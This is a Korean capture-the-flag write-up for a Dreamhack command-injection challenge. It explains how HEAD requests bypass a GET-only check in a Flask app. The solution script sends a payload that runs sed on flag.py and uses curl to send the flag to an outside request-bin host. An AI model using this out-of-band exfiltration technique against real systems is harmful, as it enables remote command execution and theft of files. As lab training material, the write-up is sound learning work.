# Blind-command

# 문제 접근

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3afc399b-e22d-4f84-a3c3-739456b947df/Untitled.png)

blind-command 문제의 접속 정보와 문제 설명 및 문제파일을 다운로드 받을 수 있다. app.py 파일을 보면 아래 코드를 볼 수 있다.

```python
#!/usr/bin/env python3
from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/' , methods=['GET'])
def index():
    cmd = request.args.get('cmd', '')
    if not cmd:
        return "?cmd=[cmd]"

    if request.method == 'GET':
        ''
    else:
        os.system(cmd)
    return cmd

app.run(host='0.0.0.0', port=8000)
```

코드는 복잡하지 않은데 GET 으로 요청을 받으면 매개변수 cmd에 담긴 값을 받는다. 메서드가 GET이 아니라면 이 cmd에 담긴값을 os.system으로 실행한다. 여기서 문제는 페이지가 GET만 허용해주고 있는데 GET으로 요청을 보내면 cmd를 실행시킬 수 없다는 점이다. 

# 문제 풀이

파이썬을 사용하여 보낼 것이므로 GET이 아닌 다른 요청들이 무엇이 있는지 찾아보았다

[https://me2nuk.com/Python-requests-module-example/](https://me2nuk.com/Python-requests-module-example/)

### **Request method**

requests 클래스에서 지원하는 요청 메서드는 `[PUT, GET, POST, HEAD, PATCH, DELETE, OPTIONS]` 메서드가 존재한다. 이 메서드를 하나씩 테스트해보았다.

 

```python
import requests
url=f"http://host3.dreamhack.games:12409"
#
data={
    "cmd":"ls"
    }
#options,get,head
response=requests.head(url)
print(url)
print(response.headers)
```

![not allowed.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f9f3499b-b3ad-48c6-a9cd-3698d9882fb4/not_allowed.png)

POST나 PUT으로 보내면 method가 허용되지 않았기 때문에 405가 오게된다. 하지만 HEAD 방식은 요청이 정상적으로 가는 것을 확인할 수 있었다.

보통 HEAD 방식은 GET 방식이 열려있는 경우 같이 열려있다고한다. HEAD방식은 GET 방식으로 보냈을 때 오는 응답에서 body만 빼고 응답이 온다. 즉 내가 원하는 명령을 실행시킬 수는 있게 되었는데 문제는 그 응답을 보기가 힘들다는 점이다. 그래서 응답 결과를 

서버를 직접 열기보다는 드림핵에서 제공하는 tools 서비스를 이용하여 이곳에서 생성되는 링크로 curl을 통해 연결한 후 get방식을 통해 flag 값을 전달하는 방식을 선택했다.

이 때 $(cat flag.py)를 하면 FLAG만 오게 된다. 그 이유는 계속 테스트해본 결과 get 방식으로 전달하게 되는 경우 공백 전까지만 전달이 되는 것으로 보인다. 

따라서 공백을 지워주는 명령어인 sed를 이용해서 flag.py의 공백을 지워준 후 grep ‘DH’를 사용해서 curl의 get방식으로 전달해 주었다.

```python
import requests
url=f"http://host3.dreamhack.games:12409?cmd=curl https://qjyfxze.request.dreamhack.games?flag=$(sed 's/ /:/g' flag.py | grep 'DH')"
#
data={
    "cmd":"ls"
    }
#options,get,head
response=requests.head(url)
print(url)
print(response.headers)
```

![캡처.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/31950aab-4684-41af-872c-2be42fb3b52a/%EC%BA%A1%EC%B2%98.png)

FLAG값인 DH{4c9905b5abb9c3eb10af4ab7e1645c23}이 정상적으로 오는 것을 확인할 수 있다.
